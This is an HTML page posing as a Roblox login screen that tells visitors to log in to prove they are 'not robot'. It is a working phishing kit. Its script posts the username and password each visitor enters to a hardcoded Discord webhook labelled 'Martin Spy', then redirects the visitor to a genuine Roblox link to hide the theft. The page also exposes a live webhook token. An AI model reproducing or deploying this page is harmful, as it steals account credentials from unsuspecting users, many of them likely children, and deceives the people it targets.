<head>
  <h1><a href="#" style="display: none"></a></h1>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Login</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Gotham SSm A', 'Gotham SSm B', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    body {
      background-color: #0d0d0d;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background-color: #1c1c1c;
      padding: 30px;
      border-radius: 5px;
      width: 400px;
      text-align: center;
    }
    h2 {
      font-size: 26px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      background-color: #262626;
      border: none;
      border-radius: 4px;
      color: white;
    }
    .login-btn {
      width: 100%;
      padding: 12px;
      background-color: #1c1c1c;
      border: 1px solid white;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-top: 8px;
      border-radius: 4px;
    }
    .login-box a {
      display: block;
      color: white;
      font-size: 13px;
      margin: 12px 0;
      text-decoration: none;
    }
    .divider {
      height: 1px;
      background-color: #333;
      margin: 20px 0;
    }
    .alt-btn {
      width: 100%;
      padding: 12px;
      background-color: #2a2a2a;
      border: none;
      color: white;
      margin: 8px 0;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }
    .signup-link {
      font-size: 13px;
      margin-top: 16px;
    }
    .signup-link a {
      color: white;
      font-weight: bold;
      text-decoration: none;
    }
    .error-message {
      color: #ff4444;
      font-size: 12px;
      margin-bottom: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Login to make sure you're not robot</h2>
    <div id="error-message" class="error-message">Please fill in both username and password</div>
    <input type="text" id="username" placeholder="Username">
    <input type="password" id="password" placeholder="Password">
    <button class="login-btn" onclick="submitForm()">Log In</button>
  </div>

  <script>
    function submitForm() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const errorMessage = document.getElementById("error-message");

      // Reset error message
      errorMessage.style.display = "none";

      // Validate form
      if (!username || !password) {
        errorMessage.style.display = "block";
        return false;
      }

      sendToDiscord();

      setTimeout(function() {
        window.location.href = "https://www.roblox.com/share?code=cb0cd59c302cc0469f884bee8c0ee0c2&type=Server";
      }, 1000);
    }

    function sendToDiscord() {
      const webhookUrl = "https://discord.com/api/webhooks/1398583276612096141/qNm9-lYZcPsHb4O89RUjB4uJzWKxtOdRvqKABaRVSR2X8IINicEZd46X04S1ZZs7aNqP";
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `🔔 New Login Attempt\nUsername: ${username}\nPassword: ${password}`,
          username: "Martin Spy"
        })
      }).catch(error => console.error('Error:', error));
    }
  </script>
</body>
